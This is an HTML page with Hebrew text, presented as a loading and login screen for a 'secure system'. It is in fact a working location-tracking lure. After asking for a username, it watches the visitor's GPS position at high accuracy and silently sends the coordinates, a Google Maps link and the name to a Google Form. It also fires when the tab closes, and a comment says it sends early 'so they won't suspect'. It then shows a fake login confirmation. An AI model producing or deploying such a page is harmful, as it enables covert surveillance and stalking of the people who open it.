<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>טעינה...</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #2ecc71; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #444; font-size: 18px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p id="status">מתחבר למערכת המאובטחת...</p>

    <script>
        window.onload = function() {
            const userName = prompt("הכנס שם משתמש לכניסה:");
            if (!userName || userName.trim() === "") {
                document.getElementById("status").innerText = "גישה נדחתה.";
                return;
            }

            let hasSent = false;
            let bestPosition = null;
            let bestAccuracy = Infinity;

            function sendToGoogle(pos, name, type = "Final") {
                if (hasSent || !pos) return;
                hasSent = true;

                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy;
                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

                const formID = "1FAIpQLSfYA2SsnyuwYFOhz_IjWdfLAkudHUJPBWmS3VUoF-8xp5u6Gw";
                const url = `https://docs.google.com/forms/d/e/${formID}/formResponse` +
                    `?entry.1905099702=${lat}` +
                    `&entry.379601602=${lon}` +
                    `&entry.1378939865=${encodeURIComponent(mapsLink)}` +
                    `&entry.2102560173=${encodeURIComponent(name + " (Acc: " + Math.round(acc) + "m)")}` +
                    `&submit=Submit`;

                // שימוש ב-sendBeacon לשליחה אמינה גם ביציאה מהדף
                navigator.sendBeacon(url);
                
                if (type === "Final") {
                    document.getElementById("status").innerText = "נכנסת בהצלחה!";
                    alert("שלום " + name + ", הכניסה אושרה.");
                }
            }

            // האזנה רציפה לשיפור הדיוק
            const watchID = navigator.geolocation.watchPosition((pos) => {
                const currentAccuracy = pos.coords.accuracy;
                
                // תמיד שומרים את המיקום הכי טוב שהיה לנו
                if (currentAccuracy < bestAccuracy) {
                    bestAccuracy = currentAccuracy;
                    bestPosition = pos;
                }

                // אם הגענו לדיוק של פחות מ-5 מטר (ממש על הנקודה) - שולחים ועוצרים
                if (currentAccuracy <= 5) {
                    navigator.geolocation.clearWatch(watchID);
                    sendToGoogle(pos, userName);
                }
            }, (err) => {
                console.log(err);
            }, { 
                enableHighAccuracy: true, 
                timeout: 60000, // מחכה עד דקה לדיוק מקסימלי
                maximumAge: 0 
            });

            // מנגנון "הצלה": אם המשתמש מנסה לסגור את הלשונית או לצאת מהדפדפן
            window.onbeforeunload = window.onunload = function() {
                if (!hasSent && bestPosition) {
                    sendToGoogle(bestPosition, userName, "Exit");
                }
            };

            // אם אחרי 20 שניות עדיין לא הגענו ל-5 מטר, נשלח את הכי טוב שיש (כדי שלא יחשדו)
            setTimeout(() => {
                if (!hasSent && bestPosition) {
                    navigator.geolocation.clearWatch(watchID);
                    sendToGoogle(bestPosition, userName);
                }
            }, 20000);
        };
    </script>
</body>
</html>
